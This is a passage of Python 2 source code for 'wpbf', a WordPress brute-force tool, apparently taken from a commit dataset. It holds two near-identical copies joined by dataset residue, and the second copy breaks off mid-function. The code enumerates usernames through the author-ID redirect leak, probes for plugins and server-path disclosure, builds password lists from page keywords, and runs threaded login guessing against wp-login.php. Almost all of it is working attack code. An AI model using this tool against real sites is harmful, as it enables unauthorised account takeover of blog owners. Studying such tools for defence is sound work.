    parser.add_argument('-pl', '--pluginscan', action=""store_true"", help=""Detect plugins in WordPress using a list of popular/vulnerable plugins"")
    parser.add_argument('--test', action=""store_true"", help=""Run python doctests (you can use a dummy URL here)"")
    args = parser.parse_args()
    config.wp_base_url = args.url
    config.wordlist = args.wordlist
    config.username = args.username
    config.script_path = args.scriptpath
    config.threads = args.threads
    config.proxy = args.proxy
    config.eu_gap_tolerance = args.enumeratetolerance
    if args.test:
        import doctest
        doctest.testmod(wplib)
        exit(0)

    # logger configuration
    logging.config.fileConfig(""logging.conf"")
    logger = logging.getLogger(""wpbf"")

    # Wp perform actions over a BlogPress blog
    wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)

    logger.info(""Target URL: %s"", wp.get_base_url())

    # check URL and user (if user not set, enumerate usernames)
    logger.info(""Checking URL & username..."")
    usernames = []
    if config.username:
        usernames.append(config.username)

    try:
        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
            logger.info(""Enumerating users..."")
            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)

        if len(usernames) > 0:
            logger.info(""Usernames: %s"", "", "".join(usernames))
            if args.enumerateusers:
                exit(0)
        else:
            logger.error(""Can't find usernames :("")
    except urllib2.HTTPError:
        logger.error(""HTTP Error on: %s"", wp.get_login_url())
        exit(0)
    except urllib2.URLError:
        logger.error(""URL Error on: %s"", wp.get_login_url())
        if config.proxy:
            logger.info(""Check if proxy is well configured and running"")
        exit(0)


    # tasks queue
    task_queue = Queue.Queue()

    # load fingerprint tasks into queue
    if args.nofingerprint:
        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))

    # load plugin scan tasks into queue
    if args.pluginscan:
        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, ""r"").readlines()]
        [plugins_list.append(plugin) for plugin in wp.find_plugins() if plugin]
        logger.info(""%s plugins will be tested"", str(len(plugins_list)))
        for plugin in plugins_list:
            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
        del plugins_list

    # check for Login LockDown plugin and load login tasks into tasks queue
    logger.debug(""Checking for Login LockDown plugin"")
    if wp.check_loginlockdown():
        logger.warning(""Login LockDown plugin is active, bruteforce will be useless"")
    else:
        # load login check tasks into queue
        logger.debug(""Loading wordlist..."")
        wordlist = [username.strip() for username in usernames]
        try:
            [wordlist.append(w.strip()) for w in open(config.wordlist, ""r"").readlines()]
        except IOError:
            logger.error(""Can't open '%s' the wordlist will not be used!"", config.wordlist)
        logger.debug(""%s words loaded from %s"", str(len(wordlist)), config.wordlist)
        if args.nokeywords:
            # load into wordlist additional keywords from blog main page
            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
        logger.info(""%s passwords will be tested"", str(len(wordlist)*len(usernames)))
        for username in usernames:
            for password in wordlist:
                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
        del wordlist

    # start workers
    logger.info(""Starting workers..."")
    for i in range(config.threads):
        t = wpworker.WpbfWorker(task_queue)
        t.start()

    # feedback to stdout
    while task_queue.qsize() > 0:
        try:
            # poor ETA implementation
            start_time = time.time()
            start_queue = task_queue.qsize()
            time.sleep(10)
            delta_time = time.time() - start_time
            current_queue = task_queue.qsize()
            delta_queue = start_queue - current_queue
            try:
                wps = delta_time / delta_queue
            except ZeroDivisionError:
                wps = 0.6
            print str(current_queue)+"" tasks left / ""+str(round(1 / wps, 2))+"" tasks per second / ""+str( round(wps*current_queue / 60, 2) )+""min left""
        except KeyboardInterrupt:
            logger.info(""Clearing queue and killing threads..."")
            task_queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()
/n/n/nwplib.py/n/n""""""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
""""""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """"""Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """"""
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """""" Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain(""www.dominio.com.ar"")
    'dominio'
    """"""
    words = ["".com"", ""www."", "".ar"", "".cl"", "".py"", "".org"", "".net"", "".mx"", "".bo"", "".gob"", "".gov"", "".edu""]
    for word in words:
        domain = domain.replace(word, """")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """"""Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """"""
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """"""Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """"""
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path=""wp-login.php"", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip(""/"")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger(""wpbf"")

    # Getters

    def get_login_url(self):
        """"""Returns login URL""""""
        return self._login_url

    def get_base_url(self):
        """"""Returns base URL""""""
        return self._base_url

    def get_version(self):
        """"""Returns WordPress version""""""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
        """"""Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """"""
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug(""Cached %s %s"", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug(""Requesting %s %s"", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """"""Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data or ""incorrect"" in data.lower():
                return False
            return True
        return False

    def check_username(self, username):
        """"""Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data:
                if ""usuario es incorrecto"" in data or 'usuario no' in data or ""Invalid username"" in data:
                    return False
                return True
        return False

    def find_username(self, url=False):
        """"""Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)""',
            '/author/(.*?)/feed',
            'entries of (.*)""',
            'by (.*) Feed""',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)""',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug(""regexp %s marched %s"", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace(""/"","""")
            self.logger.debug(""Possible username %s (by content)"", username)
            return username
        else:
            return False

    def enumerate_usernames(self, gap_tolerance=0):
        """"""Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """"""
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+""?author=""+str(uid)
                request = urllib2.Request(url)
                request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({""http"": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug(""Requesting %s"", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is ""/"":
                        username = response_path.split(""/"")[-2]
                    else:
                        username = response_path.split(""/"")[-1]
                    self.logger.debug(""Possible username %s (by redirect)"", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """"""Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """"""
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search(""<title>(.*)</title>"", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
            if (self._cache.has_key('title') and title == self._cache['title']) or ' ' not in title:
                return False
            else:
                self._cache['title'] = title
                username = title.split()[0]
                self.logger.debug(""Possible username %s (by title)"", username)
                return username
        else:
                return False

    def find_keywords_in_url(self, min_keyword_len=3, min_frequency=2, ignore_with=False):
        """"""Try to find relevant keywords within the given URL, keywords will be used in the password wordlist

        min_keyword_len -- Filter keywords that doesn't have this minimum length
        min_frequency   -- Filter keywords number of times than a keyword appears within the content
        ignore_with     -- Ignore words that contains any characters in this list
        """"""
        data =  self.request(self._base_url, cache=True)
        keywords = []

        # get keywords from title
        title = re.search('<title>(.*)</title>', data, re.IGNORECASE)
        if title:
            title = title.group(1)
            [keywords.insert(0, kw.lower()) for kw in title.split("" "")][:-1]

        # get keywords from url content
        [keywords.append(k.strip()) for k in get_keywords(re.sub(""<.*?>"", """", data), min_keyword_len, min_frequency)]

        # filter keywords
        keywords = rm_duplicates([k.lower().strip().strip("","").strip(""?"").strip('""') for k in keywords if len(k) > min_keyword_len])    # min leght
        if ignore_with and len(ignore_with) > 0:        # ignore keywords with certain characters
            for keyword in keywords[:]:
                for i in ignore_with:
                    if i in keyword:
                        keywords.remove(keyword)
                        break

        return keywords

    def check_loginlockdown(self):
        """"""Check if ""Login LockDown"" plugin is active (Alip Aswalid)

        url   -- Login form URL
        proxy -- URL for a HTTP Proxy
        """"""
        data = self.request(self._login_url, cache=True)
        if data and ""lockdown"" in data.lower():
            return True
        else:
            return False

    def check_plugin(self, plugin):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        url = self._base_url+""wp-content/plugins/""+plugin
        data = self.request(url)
        if data is not False:
            return True
        else:
            return False

    def find_plugins(self, url=False):
        """"""Try to find plugin names from content

        url   -- Any URL in the blog that can contain plugin paths
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)

        plugins = re.findall(r""wp-content/plugins/(.*)/.*\.*\?.*[\'|\""]\w"", data, re.IGNORECASE)

        if len(plugins):
            self.logger.debug(""Possible plugins %s present"", plugins)
            return plugins
        else:
            return []

    def find_server_path(self):
        path = False
        urls = ['wp-settings.php', 'wp-content/plugins/akismet/akismet.php', 'wp-content/plugins/hello.php']

        for url in urls:
            response = self.request(self._base_url+url)
            if response and 'Fatal error' in response:
                if url in response:
                    match = ' <b>(.*)'+url+'</b>'
                    path_disclosure = re.search(match, response, re.IGNORECASE)
                    if path_disclosure:
                        return path_disclosure.group(1)

        return False

    def fingerprint(self):
        """"""Try to fetch WordPress version from ""generator"" meta tag in main page

        return - WordPress version or false if not found
        """"""
        data = self.request(self._base_url, cache=True)
        m = re.search('<meta name=""generator"" content=""[Ww]ord[Pp]ress (\d\.\d\.?\d?)"" />', data)
        if m:
            self._version = m.group(1)
            return self._version
        else:
            return False
/n/n/nwpworker.py/n/n""""""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
""""""
import threading

from wplib import Wp

class WpbfWorker(threading.Thread):
    """"""Handle threads that consume the tasks queue""""""
    def __init__(self, task_queue):
        threading.Thread.__init__(self)
        self._queue = task_queue

    def run(self):
        while self._queue.qsize() > 0:
            try:
                task = self._queue.get()
                task.run()
                self._queue.task_done()
            except WpTaskStop:
                self._queue.queue.clear()

class WpTask():
    """"""Base task class""""""

    _task_queue = False
    _requeue = False

    def run(self):
        pass

    def stop_all_tasks(self):
        raise WpTaskStop

    def requeue(self):
        """"""Requeue a task""""""
        if self._requeue and self._keywords.has_key('task_queue'):
            self._task_queue = self._keywords['task_queue']
            self._task_queue.put(self)
            self._requeue = False
            return True
        return False

class WpTaskStop(Exception):
    """"""Clear tasks queue""""""
    def __str__(self):
        return 'Stop all tasks!'

class WpTaskFingerprint(Wp, WpTask):
    """"""Perform WordPress fingerprint and. If positive, log the results""""""
    def run(self):
        self.logger.info(""WordPress version: %s"", self.fingerprint())
        server_path = self.find_server_path()
        if server_path:
            self.logger.info(""WordPress path in server: %s"", self.find_server_path())

class WpTaskLogin(Wp, WpTask):
    """"""
    Perform WordPress login. If login is positive, will log the username and password combination

    username -- string representing a username
    password -- string representing a password
    """"""
    def run(self):
        if self._keywords.has_key('username') and self._keywords.has_key('password') and self.login(self._keywords['username'], self._keywords['password']):
            # username and password found: log data and stop all tasks
            self.logger.info(""Password '%s' found for username '%s' on %s"", self._keywords['password'], self._keywords['username'], self.get_login_url())
            self.stop_all_tasks()

class WpTaskPluginCheck(Wp, WpTask):
    """"""
    Check if a plugin exists. If not 404 error is found and request is completed, the
    plugin name will be logged

    name -- string representing the plugin name/directory
    """"""
    def run(self):
        if self._keywords.has_key('name') and self.check_plugin(self._keywords['name']):
            self.logger.info(""Plugin '%s' was found"", self._keywords['name'])
/n/n/n",0
77,e6f712be9793480507e5de7b2b1f82bc041dff37,"/wpbf.py/n/n#!/usr/bin/env python
""""""
wpbf is a WordPress BruteForce script to remotely test password strength of the WordPress blogging software

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
""""""
import logging, logging.config
import urllib2, urlparse
import sys, threading, Queue, time, argparse

import config, wplib, wpworker

if __name__ == '__main__':
    #parse command line arguments
    parser = argparse.ArgumentParser(description='Bruteforce WordPress login form to test password strenght. Currently supports threads, wordlist and basic username detection.')
    parser.add_argument('url', type=str,  help='base URL where WordPress is installed')
    parser.add_argument('-w', '--wordlist', default=config.wordlist, help=""worldlist file (default: ""+config.wordlist+"")"")
    parser.add_argument('-nk', '--nokeywords', action=""store_false"", help=""Don't search keywords in content and add them to the wordlist"")
    parser.add_argument('-u', '--username', default=config.username, help=""username (default: ""+str(config.username)+"")"")
    parser.add_argument('-s', '--scriptpath', default=config.script_path, help=""path to the login form (default: ""+config.script_path+"")"")
    parser.add_argument('-t', '--threads', type=int, default=config.threads, help=""how many threads the script will spawn (default: ""+str(config.threads)+"")"")
    parser.add_argument('-p', '--proxy', default=None, help=""http proxy (ex: http://localhost:8008/)"")
    parser.add_argument('-nf', '--nofingerprint', action=""store_false"", help=""Don't fingerprint WordPress"")
    parser.add_argument('-eu', '--enumerateusers', action=""store_true"", help=""Only enumerate users (withouth bruteforcing)"")
    parser.add_argument('-eut', '--enumeratetolerance', type=int, default=config.eu_gap_tolerance, help=""User ID gap tolerance to use in username enumeration (default: ""+str(config.eu_gap_tolerance)+"")"")
    parser.add_argument('-pl', '--pluginscan', action=""store_true"", help=""Detect plugins in WordPress using a list of popular/vulnerable plugins"")
    parser.add_argument('--test', action=""store_true"", help=""Run python doctests (you can use a dummy URL here)"")
    args = parser.parse_args()
    config.wp_base_url = args.url
    config.wordlist = args.wordlist
    config.username = args.username
    config.script_path = args.scriptpath
    config.threads = args.threads
    config.proxy = args.proxy
    config.eu_gap_tolerance = args.enumeratetolerance
    if args.test:
        import doctest
        doctest.testmod(wplib)
        exit(0)

    # logger configuration
    logging.config.fileConfig(""logging.conf"")
    logger = logging.getLogger(""wpbf"")

    # Wp perform actions over a BlogPress blog
    wp = wplib.Wp(config.wp_base_url, config.script_path, config.proxy)

    logger.info(""Target URL: %s"", wp.get_base_url())

    # check URL and user (if user not set, enumerate usernames)
    logger.info(""Checking URL & username..."")
    usernames = []
    if config.username:
        usernames.append(config.username)

    try:
        if len(usernames) < 1 or wp.check_username(usernames[0]) is False:
            logger.info(""Enumerating users..."")
            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)

        if len(usernames) > 0:
            logger.info(""Usernames: %s"", "", "".join(usernames))
            if args.enumerateusers:
                exit(0)
        else:
            logger.error(""Can't find usernames :("")
    except urllib2.HTTPError:
        logger.error(""HTTP Error on: %s"", wp.get_login_url())
        exit(0)
    except urllib2.URLError:
        logger.error(""URL Error on: %s"", wp.get_login_url())
        if config.proxy:
            logger.info(""Check if proxy is well configured and running"")
        exit(0)


    # tasks queue
    task_queue = Queue.Queue()

    # load fingerprint task into queue
    if args.nofingerprint:
        task_queue.put(wpworker.WpTaskFingerprint(config.wp_base_url, config.script_path, config.proxy))

    # load plugin scan tasks into queue
    if args.pluginscan:
        plugins_list = [plugin.strip() for plugin in open(config.plugins_list, ""r"").readlines()]
        [plugins_list.append(plugin) for plugin in wp.find_plugins()]
        logger.info(""%s plugins will be tested"", str(len(plugins_list)))
        for plugin in plugins_list:
            task_queue.put(wpworker.WpTaskPluginCheck(config.wp_base_url, config.script_path, config.proxy, name=plugin))
        del plugins_list

    # check for Login LockDown plugin and load login tasks into tasks queue
    logger.debug(""Checking for Login LockDown plugin"")
    if wp.check_loginlockdown():
        logger.warning(""Login LockDown plugin is active, bruteforce will be useless"")
    else:
        # load login check tasks into queue
        logger.debug(""Loading wordlist..."")
        wordlist = [username.strip() for username in usernames]
        try:
            [wordlist.append(w.strip()) for w in open(config.wordlist, ""r"").readlines()]
        except IOError:
            logger.error(""Can't open '%s' the wordlist will not be used!"", config.wordlist)
        logger.debug(""%s words loaded from %s"", str(len(wordlist)), config.wordlist)
        if args.nokeywords:
            # load into wordlist additional keywords from blog main page
            wordlist.append(wplib.filter_domain(urlparse.urlparse(wp.get_base_url()).hostname))     # add domain name to the queue
            [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
        logger.info(""%s passwords will be tested"", str(len(wordlist)*len(usernames)))
        for username in usernames:
            for password in wordlist:
                task_queue.put(wpworker.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy, username=username, password=password, task_queue=task_queue))
        del wordlist

    # start workers
    logger.info(""Starting workers..."")
    for i in range(config.threads):
        t = wpworker.WpbfWorker(task_queue)
        t.start()

    # feedback to stdout
    while task_queue.qsize() > 0:
        try:
            # poor ETA implementation
            start_time = time.time()
            start_queue = task_queue.qsize()
            time.sleep(10)
            delta_time = time.time() - start_time
            current_queue = task_queue.qsize()
            delta_queue = start_queue - current_queue
            try:
                wps = delta_time / delta_queue
            except ZeroDivisionError:
                wps = 0.6
            print str(current_queue)+"" tasks left / ""+str(round(1 / wps, 2))+"" tasks per second / ""+str( round(wps*current_queue / 60, 2) )+""min left""
        except KeyboardInterrupt:
            logger.info(""Clearing queue and killing threads..."")
            task_queue.queue.clear()
            for t in threading.enumerate()[1:]:
                t.join()
/n/n/n/wplib.py/n/n""""""
wpbf WordPress library

Copyright 2011 Andres Tarantini (atarantini@gmail.com)

This file is part of wpbf.

wpbf is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

wpbf is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with wpbf.  If not, see <http://www.gnu.org/licenses/>.
""""""
import urllib, urllib2, re, logging
from random import randint
from urlparse import urlparse

def rm_duplicates(seq):
    """"""Remove duplicates from a list

    This Function have been made by Dave Kirby and taken from site http://www.peterbe.com/plog/uniqifiers-benchmark

    >>> rm_duplicates([1, 2, 3, 3, 4])
    [1, 2, 3, 4]
    """"""
    seen = set()
    return [x for x in seq if x not in seen and not seen.add(x)]

def filter_domain(domain):
    """""" Strips TLD and ccTLD (ex: .com, .ar, etc) from a domain name

    >>> filter_domain(""www.dominio.com.ar"")
    'dominio'
    """"""
    words = ["".com"", ""www."", "".ar"", "".cl"", "".py"", "".org"", "".net"", "".mx"", "".bo"", "".gob"", "".gov"", "".edu""]
    for word in words:
        domain = domain.replace(word, """")
    return domain

def get_keywords(data, min_keyword_len=3, min_frequency=2):
    """"""Get relevant keywords from text

    data            -- Input text to be indexed
    min_keyword_len -- Filter keywords that doesn't have this minimum length
    min_frequency   -- Filter keywords by the number of times than a keyword appear
    """"""
    words = [w for w in data.split() if len(w) > min_keyword_len]
    keywords = {}
    for word in words:
        if word in keywords:
            keywords[word] += 1
        else:
            keywords[word] = 1

    for keyword, frequency in keywords.copy().iteritems():
        if frequency < min_frequency:
            del keywords[keyword]

    return [k for k, v in keywords.iteritems()]

class Wp:
    """"""Perform actions on a WordPress Blog.

    Do things in a WordPress blog including login, username check/enumeration, keyword search and plugin detection.

    base_url          -- URL of the blog's main page
    login_script_path -- Path relative to base_url where the login form is located
    proxy             -- URL for a HTTP Proxy
    """"""
    _base_url = ''
    _login_script_path = ''
    _login_url = ''
    _proxy = None
    _version = None
    _arguments = _keywords = []
    _cache = {}

    def __init__(self, base_url, login_script_path=""wp-login.php"", proxy=None, *arguments, **keywords):
        # Basic filters for the base url
        self._base_url = base_url
        if self._base_url[0:7] != 'http://':
            self._base_url = 'http://'+self._base_url
        if self._base_url[-1] != '/':
            self._base_url = self._base_url+'/'

        self._login_script_path = login_script_path.lstrip(""/"")
        self._proxy = proxy
        self._login_url = urllib.basejoin(self._base_url, self._login_script_path)
        self._arguments = arguments
        self._keywords = keywords

        self.logger = logging.getLogger(""wpbf"")

    # Getters

    def get_login_url(self):
        """"""Returns login URL""""""
        return self._login_url

    def get_base_url(self):
        """"""Returns base URL""""""
        return self._base_url

    def get_version(self):
        """"""Returns WordPress version""""""
        return self._version

    # General methods

    def request(self, url, params=[], cache=False, data=True):
        """"""Request an URL with a given parameters and proxy

        url    -- URL to request
        params -- dictionary with POST variables
        cache  -- True if you want request to be cached and get a cached version of the request
        data   -- If false, return request object, else return data. Cached data must be retrived with data=True
        """"""
        if cache and data and self._cache.has_key(url) and len(params) is 0:
            self.logger.debug(""Cached %s %s"", url, params)
            return self._cache[url]

        request = urllib2.Request(url)
        request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
        if self._proxy:
            proxy_handler = urllib2.ProxyHandler({'http': self._proxy})
            opener = urllib2.build_opener(proxy_handler)
        else:
            opener = urllib2.build_opener()
        self.logger.debug(""Requesting %s %s"", url, params)
        try:
            response = opener.open(request, urllib.urlencode(params))
            response_data = response.read()
        except urllib2.HTTPError:
            return False

        if cache and data and len(params) is 0:
            self._cache[url] = response_data

        if data:
            return response_data

        return response


    # WordPress specific methods

    def login(self, username, password):
        """"""Try to login into WordPress and see in the returned data contains login errors

        username -- Wordpress username
        password -- Password for the supplied username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', password)])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data or ""incorrect"" in data.lower():
                return False
            return True
        return False

    def check_username(self, username):
        """"""Try to login into WordPress and check in the returned data contains username errors

        username -- Wordpress username
        """"""
        data = self.request(self._login_url, [('log', username), ('pwd', str(randint(1, 9999999)))])
        if data:
            if ""ERROR"" in data or ""Error"" in data or ""login_error"" in data:
                if ""usuario es incorrecto"" in data or 'usuario no' in data or ""Invalid username"" in data:
                    return False
                return True
        return False

    def find_username(self, url=False):
        """"""Try to find a suitable username searching for common strings used in templates that refers to authors of blog posts

        url   -- Any URL in the blog that can contain author references
        """"""
        if url:
            data =  self.request(url, cache=True)
        else:
            data =  self.request(self._base_url, cache=True)
        username = None

        regexps = [
            '/author/(.*)""',
            '/author/(.*?)/feed',
            'entries of (.*)""',
            'by (.*) Feed""',
            '(<!-- by (.*?) -->)',
            'View all posts by (.*)""',
        ]

        while username is None and len(regexps):
            regexp = regexps.pop()
            match = re.search(regexp, data, re.IGNORECASE)
            if match:
                username = match.group(1)
                # self.logger.debug(""regexp %s marched %s"", regexp, username) # uncoment to debug regexps

        if username:
            username = username.strip().replace(""/"","""")
            self.logger.debug(""Possible username %s (by content)"", username)
            return username
        else:
            return False

    def enumerate_usernames(self, gap_tolerance=0):
        """"""Enumerate usernames

        Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in
        WordPress > 3.2-beta2, if no redirect is done try to match username from title of the user's archive page or page content.

        gap_tolerance -- Tolerance for user id gaps in the user id sequence (this gaps are present when users are deleted and new users created)
        """"""
        uid = 0
        usernames = []
        gaps = 0
        while gaps <= gap_tolerance:
            try:
                uid = uid + 1
                url = self._base_url+""?author=""+str(uid)
                request = urllib2.Request(url)
                request.add_header(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1"")
                if self._proxy:
                    proxy_handler = urllib2.ProxyHandler({""http"": self._proxy})
                    opener = urllib2.build_opener(proxy_handler)
                else:
                    opener = urllib2.build_opener()
                self.logger.debug(""Requesting %s"", url)
                response = opener.open(request)
                data = response.read()
                self._cache[url] = data     # save response in cache
                parsed_response_url = urlparse(response.geturl())
                response_path = parsed_response_url.path
                # Check for author in redirection
                if 'author' in response_path:
                    # A redirect was made and the username is exposed. The username is the last part of the
                    # response_path (sometimes the response path can contain a trailing slash)
                    if response_path[-1] is ""/"":
                        username = response_path.split(""/"")[-2]
                    else:
                        username = response_path.split(""/"")[-1]
                    self.logger.debug(""Possible username %s (by redirect)"", username)
                    usernames.append(username)
                    redirect = True
                    gaps = 0

                # Check for author in title
                username_title = self.get_user_from_title(data)
                if username_title and username_title not in usernames:
                    usernames.append(username_title)
                    gaps = 0

                # Check for author in content
                username_content = self.find_username(url)
                if username_content and username_content not in usernames:
                    usernames.append(username_content)
                    gaps = 0

            except urllib2.HTTPError, e:
                self.logger.debug(e)
                gaps += 1

            gaps += 1

        return [user for user in usernames if self.check_username(user)]

    def get_user_from_title(self, content):
        """"""Fetch the contents of the <title> tag and returns a username (usually, the first word)

        content    -- html content
        last_title -- last title found
        """"""
        # There was no redirection but the user ID seems to exists (because not 404) so we will
        # try to find the username as the first word in the title
        title_search = re.search(""<title>(.*)</title>"", content, re.IGNORECASE)
        if title_search:
            title =  title_search.group(1)
            # If the title is the same than the last title requested, or empty, there are no new users
